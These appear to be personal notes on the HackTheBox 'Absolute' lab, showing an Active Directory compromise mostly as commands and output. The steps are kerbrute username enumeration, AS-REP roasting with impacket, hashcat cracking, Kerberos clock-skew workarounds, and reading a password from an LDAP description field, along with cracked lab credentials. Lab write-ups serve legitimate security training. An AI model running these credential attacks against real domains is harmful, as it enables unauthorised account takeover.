* https://0xdf.gitlab.io/2023/05/27/htb-absolute.html

# Auth as d.klay
### Get Username List
```bash
for i in $(seq 1 6); do wget "http://absolute.htb/images/hero_${i}.jpg" ; done

for i in $(seq 1 6); do exiftool hero_${i}.jpg | grep Author | awk '{print $3 " " $4}'; done | tee users
James Roberts
Michael Chaffrey
Donald Klay
Sarah Osvald
Jeffer Robinson
Nicole Smith

~/Tools/username-anarchy/username-anarchy -i users | tee usernames

~/go/bin/kerbrute userenum --dc dc.absolute.htb -d absolute.htb usernames

2023/11/14 16:15:54 >  Using KDC(s):
2023/11/14 16:15:54 >   dc.absolute.htb:88

2023/11/14 16:15:54 >  [+] VALID USERNAME:       j.roberts@absolute.htb
2023/11/14 16:15:55 >  [+] VALID USERNAME:       m.chaffrey@absolute.htb
2023/11/14 16:15:55 >  [+] VALID USERNAME:       s.osvald@absolute.htb
2023/11/14 16:15:55 >  [+] VALID USERNAME:       d.klay@absolute.htb
2023/11/14 16:15:55 >  [+] VALID USERNAME:       j.robinson@absolute.htb
2023/11/14 16:15:56 >  [+] VALID USERNAME:       n.smith@absolute.htb
```

##### Double confirm with crackmapexec

```zsh
crackmapexec smb $IP -u usernames_short -p ''
SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.59   445    DC               [-] absolute.htb\j.roberts: STATUS_ACCOUNT_RESTRICTION 
SMB         10.129.229.59   445    DC               [-] absolute.htb\m.chaffrey: STATUS_ACCOUNT_RESTRICTION 
SMB         10.129.229.59   445    DC               [-] absolute.htb\s.osvald: STATUS_ACCOUNT_RESTRICTION 
SMB         10.129.229.59   445    DC               [-] absolute.htb\d.klay: STATUS_ACCOUNT_RESTRICTION 
SMB         10.129.229.59   445    DC               [-] absolute.htb\j.robinson: STATUS_ACCOUNT_RESTRICTION 
SMB         10.129.229.59   445    DC               [-] absolute.htb\n.smith: STATUS_ACCOUNT_RESTRICTION
```

The purple `[-]` fails with `STATUS_ACCOUNT_RESTRICTION` rather than the others which return `STATUS_LOGON_FAILURE`, suggesting those accounts exist

### AS-Rep-Roast
```bash
impacket-GetNPUsers -dc-ip dc.absolute.htb -usersfile usernames_short absolute.htb/

$krb5asrep$23$d.klay@ABSOLUTE.HTB:0873728c96c41252f7e9640eaf9fb9db$3b8c9a135464acfc7c2ad55acd0d61bddd683bbd5ad899897c6f478fa8c15f47f2f6a08904d098ab397ac2c687e708a5e0ba024493ca213f080abd8e30b1b814cc5ee83b1c5beceec377c3fab777e80401adf167865f5e57a205e76f028b3ff3cac758ea6d10baa2b934503a552ee760b81f1912ae5ce2a3c77ddd2d8acc1e472afb689150a276c81ecefacce806c504907a3c987f302e60a844c3d0e65f619901086ad073aefdbf2fbce88bc78312a1d08c86c573f5c8403319b8a09ce8f226e555f14e59d0fd285ac68ccb6748ed02bf34dcb45e7ffde9fdf598025fbf20fdd859c93eca38a785d34cfdda

hashcat d.klay.hash /usr/share/wordlists/rockyou.txt 

Darkmoonsky248girl
```

### Kerberos Auth
##### Failed without Kerberos
`STATUS_ACCOUNT_RESTRICTION` typically means NTLM is disabled, and need to use Kerberos for auth. That works:

```bash
crackmapexec smb $IP -u d.klay -p 'Darkmoonsky248girl'
SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.59   445    DC               [-] absolute.htb\d.klay:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION 
crackmapexec smb $IP -u d.klay -p 'Darkmoonsky248girl' -k
SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.59   445    DC               [-] absolute.htb\d.klay: KRB_AP_ERR_SKEW 
```

##### Method 1, Kinit
It needs to config `/etc/resolv.conf` by adding the Kali's IP as nameserver and `/etc/krb5.conf`.

```conf
[libdefaults]   
    	default_realm = ABSOLUTE.HTB

[realms]
        ABSOLUTE.HTB = {
                kdc = dc.absolute.htb
        }
```

Otherwise, it'll be super slow even it's worked.

```bash
kinit d.klay
Password for d.klay@ABSOLUTE.HTB: 

klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: d.klay@ABSOLUTE.HTB

Valid starting     Expires            Service principal
20/11/23 17:31:35  20/11/23 21:31:35  krbtgt/ABSOLUTE.HTB@ABSOLUTE.HTB
        renew until 20/11/23 21:31:35

sudo ntpdate -u absolute.htb
2023-11-20 17:32:37.857792 (+1300) +25184.900725 +/- 0.109022 absolute.htb 10.129.229.59 s1 no-leap
CLOCK: time stepped by 25184.900725

faketime '2023-11-20 17:36:00' crackmapexec smb $IP -u d.klay -p 'Darkmoonsky248girl' -k
SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.59   445    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl 
❯ faketime '2023-11-20 17:36:00' crackmapexec smb $IP -u d.klay -p 'Darkmoonsky248girl' -k --shares
SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.59   445    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl 
SMB         10.129.229.59   445    DC               [+] Enumerated shares
SMB         10.129.229.59   445    DC               Share           Permissions     Remark
SMB         10.129.229.59   445    DC               -----           -----------     ------
SMB         10.129.229.59   445    DC               ADMIN$                          Remote Admin
SMB         10.129.229.59   445    DC               C$                              Default share
SMB         10.129.229.59   445    DC               IPC$            READ            Remote IPC
SMB         10.129.229.59   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.229.59   445    DC               Shared                          
SMB         10.129.229.59   445    DC               SYSVOL          READ            Logon server share 
```

##### Method 2, impacket-getTGT
I'd perfer it since it doesn't need to make configurations. Although, it requires to know the `-dc-ip`

```bash
impacket-getTGT absolute.htb/d.klay:Darkmoonsky248girl -dc-ip dc.absolute.htb
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Saving ticket in d.klay.ccache

rm /tmp/krb5cc_1000
klist
klist: No credentials cache found (filename: /tmp/krb5cc_1000)

export KRB5CCNAME=d.klay.ccache
faketime '2023-11-20 17:50:00' crackmapexec smb $IP -u d.klay -p 'Darkmoonsky248girl' -k --shares
SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.59   445    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl 
SMB         10.129.229.59   445    DC               [+] Enumerated shares
```

### Bloodbound-python
It requires adding `nameserver Victim's DC_IP 10.129.229.59`

```bash
faketime '2023-11-20 18:49:00' bloodhound-python -u d.klay -p 'Darkmoonsky248girl' -k -d absolute.htb -dc dc.absolute.htb
INFO: Found AD domain: absolute.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc.absolute.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Found 18 users
INFO: Connecting to LDAP server: dc.absolute.htb
INFO: Found 55 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.absolute.htb
INFO: Done in 00M 23S
```

# Auth as svc_smb
### Method 1, ldapsearch
Annonying part:

```bash
faketime '2023-11-20 19:00:00' ldapsearch -H ldap://dc.absolute.htb -Y GSSAPI -b "cn=users,dc=absolute,dc=htb"
SASL/GSSAPI authentication started
ldap_sasl_interactive_bind: Local error (-2)
        additional info: SASL(-1): generic failure: GSSAPI Error: No credentials were supplied, or the credentials were unavailable or inaccessible (No Kerberos credentials available (default cache: FILE:/tmp/krb5cc_1000))
        ```

To fix this, make sure that `dc.absolute.htb` comes before `absolute.htb` in `/etc/hosts`. That’s because Kerberos is doing a reverse lookup on the IP to get the server name. My OS checks the hosts file, and gets the first host with that IP. Then when it tries to look up that host (absolute.htb) in the Kerberos DB, it doesn’t find one, and returns Server not found in Kerberos database. Props to Ippsec for figuring this out - * https://www.youtube.com/watch?v=rfAmMQV_wss&t=34m45s

```bash
faketime '2023-11-20 19:08:00' ldapsearch -H ldap://dc.absolute.htb -Y GSSAPI -b "cn=users,dc=absolute,dc=htb"
faketime '2023-11-20 19:08:00' ldapsearch -H ldap://dc.absolute.htb -Y GSSAPI -b "cn=users,dc=absolute,dc=htb" 'user'
faketime '2023-11-20 19:08:00' ldapsearch -H ldap://dc.absolute.htb -Y GSSAPI -b "cn=users,dc=absolute,dc=htb" 'user' 'description'

# svc_smb, Users, absolute.htb
dn: CN=svc_smb,CN=Users,DC=absolute,DC=htb
description: AbsoluteSMBService123!
```

##### Method 2, CME
It's better

```bash
faketime '2023-11-20 19:14:00' crackmapexec ldap $IP -u d.klay -p 'Darkmoonsky248girl' -k --users
SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
LDAP        10.129.229.59   389    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl 
LDAP        10.129.229.59   389    DC               [*] Total of records returned 20
LDAP        10.129.229.59   389    DC               Administrator                  Built-in account for administering the computer/domain
LDAP        10.129.229.59   389    DC               Guest                          Built-in account for guest access to the computer/domain
LDAP        10.129.229.59   389    DC               krbtgt                         Key Distribution Center Service Account
LDAP        10.129.229.59   389    DC               J.Roberts                      
LDAP        10.129.229.59   389    DC               M.Chaffrey                     
LDAP        10.129.229.59   389    DC               D.Klay                         
LDAP        10.129.229.59   389    DC               s.osvald                       
LDAP        10.129.229.59   389    DC               j.robinson                     
LDAP        10.129.229.59   389    DC               n.smith                        
LDAP        10.129.229.59   389    DC               m.lovegod                      
LDAP        10.129.229.59   389    DC               l.moore                        
LDAP        10.129.229.59   389    DC               c.colt                         
LDAP        10.129.229.59   389    DC               s.johnson                      
LDAP        10.129.229.59   389    DC               d.lemm                         
LDAP        10.129.229.59   389    DC               svc_smb                        AbsoluteSMBService123!
LDAP        10.129.229.59   389    DC               svc_audit                      
LDAP        10.129.229.59   389    DC               winrm_user                     Used to perform simple network tasks

faketime '2023-11-20 19:16:00' crackmapexec smb $IP -u svc_smb -p 'AbsoluteSMBService123!' -k
SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.59   445    DC               [+] absolute.htb\svc_smb:AbsoluteSMBService123!

faketime '2023-11-20 22:28:00' crackmapexec smb $IP -u svc_smb -p 'AbsoluteSMBService123!' -k --shares
SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.59   445    DC               [+] absolute.htb\svc_smb:AbsoluteSMBService123! 
SMB         10.129.229.59   445    DC               [+] Enumerated shares
SMB         10.129.229.59   445    DC               Share           Permissions     Remark
SMB         10.129.229.59   445    DC               -----           -----------     ------
SMB         10.129.229.59   445    DC               ADMIN$                          Remote Admin
SMB         10.129.229.59   445    DC               C$                              Default share
SMB         10.129.229.59   445    DC               IPC$            READ            Remote IPC
SMB         10.129.229.59   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.229.59   445    DC               Shared          READ            
SMB         10.129.229.59   445    DC               SYSVOL          READ            Logon server share
```

# Auth as m.lovegod
### Enum
##### Bloodhound
Mark `svc_smb` owned, Unfortunately, the permissions are the same as d.klay.

##### Method 1, Impacket-Smbclient via TGT instead of kinit
Again, it's better since it doesn't need to config the `/etc/krb5.conf`

```bash
faketime '2023-11-20 20:13:00' impacket-getTGT absolute.htb/svc_smb:AbsoluteSMBService123! -dc-ip dc.absolute.htb
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Saving ticket in svc_smb.ccache
export KRB5CCNAME=svc_smb.ccache

faketime '2023-11-20 20:13:00' impacket-smbclient 'absolute.htb/svc_smb:AbsoluteSMBService123!@dc.absolute.htb' -k
faketime '2023-11-20 19:44:00' impacket-smbclient 'absolute.htb/svc_smb:AbsoluteSMBService123!@dc.absolute.htb' -k -no-pass

# use Shared
# ls
drw-rw-rw-          0  Fri Sep  2 05:02:23 2022 .
drw-rw-rw-          0  Fri Sep  2 05:02:23 2022 ..
-rw-rw-rw-         72  Fri Sep  2 05:02:23 2022 compiler.sh
-rw-rw-rw-      67584  Fri Sep  2 05:02:23 2022 test.exe
# shares
ADMIN$
C$
IPC$
NETLOGON
Shared
SYSVOL

```

##### Method 2, Smbclient
* https://unix.stackexchange.com/questions/722817/the-kerberos-option-is-deprecated-on-smbclient-but-is-the-only-option-working

I tried to make it work but gave up in the end.

```bash
faketime '2023-11-20 20:10:00' smbclient -L //absolute.htb -U 'svc_smb@absolute.htb%AbsoluteSMBService123!' --use-kerberos=required --use-krb5-ccache=svc_smb.ccache
gensec_spnego_client_negTokenInit_step: gse_krb5: creating NEG_TOKEN_INIT for cifs/absolute.htb failed (next[(null)]): NT_STATUS_INVALID_PARAMETER
session setup failed: NT_STATUS_INVALID_PARAMETER
```

### Moving on windows
I didn't do that.
* https://0xdf.gitlab.io/2023/05/27/htb-absolute.html#dynamic-analysis

### CME to Verify it
```bash
faketime '2023-11-20 22:34:00' crackmapexec smb $IP -u m.lovegod -p 'AbsoluteLDAP2022!' -k
SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.59   445    DC               [+] absolute.htb\m.lovegod:AbsoluteLDAP2022!
```